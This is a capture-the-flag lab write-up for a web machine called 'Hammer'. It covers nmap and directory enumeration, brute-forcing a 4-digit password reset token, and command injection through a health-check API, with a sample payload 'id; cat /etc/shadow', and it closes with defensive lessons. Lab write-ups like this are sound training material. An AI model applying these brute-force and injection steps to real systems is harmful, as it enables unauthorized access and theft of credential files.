---
title: Hammer
difficulty: Medium
environment: Web
tags:
  - Brute Force
  - API Abuse
  - RCE
  - Auth Bypass
  - Apache
  - Jetty
  - Web
  - Enumeration
image: "https://cards.scryfall.io/art_crop/front/c/4/c4c2c914-e9a7-450b-88d9-8885fe0f6643.jpg?1675957081"
image_alt: "Essence Channeler art"
date: 2026-02-21
---

## Overview

Hammer is an intermediate-difficulty web-focused machine. It presents a modern web application with multiple layers of authentication bypass and API abuse leading to full compromise.

## Reconnaissance

### Nmap Scan

```
$ nmap -sC -sV -oN nmap/hammer 10.10.11.xx
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache/2.4.54
443/tcp open  ssl     Apache/2.4.54
8080/tcp open http    Jetty 9.4.48
```

The box runs Apache with HTTPS on the standard ports and a Jetty application server on 8080.

### Directory Enumeration

```
$ feroxbuster -u https://10.10.11.xx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
200  GET  /api/v1/
200  GET  /api/v1/docs
302  GET  /admin → /login
200  GET  /static/js/app.js
```

The API documentation endpoint at `/api/v1/docs` reveals the full REST API schema including authentication endpoints.

## Exploitation

### Authentication Bypass

The password reset flow uses a predictable 4-digit token sent via email. By brute-forcing the token within the rate limit window:

```
$ python3 brute_reset.py --target https://10.10.11.xx \
  --user admin@hammer.htb --range 0000-9999 --threads 20
```

### API Abuse

Once authenticated, the API exposes an endpoint for executing "health checks" that accepts arbitrary commands via the `cmd` parameter:

```
POST /api/v1/health HTTP/1.1
Authorization: Bearer eyJ...
Content-Type: application/json

{"cmd": "id; cat /etc/shadow"}
```

### Privilege Escalation

The web application runs as a service user. Examining the Jetty configuration reveals credentials for the management interface on port 8080, which runs as root.

## Flags

- **User:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Root:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

## Lessons Learned

Rate limiting must be enforced on authentication and password reset flows. API endpoints should never accept raw system commands, and management interfaces must be properly isolated.
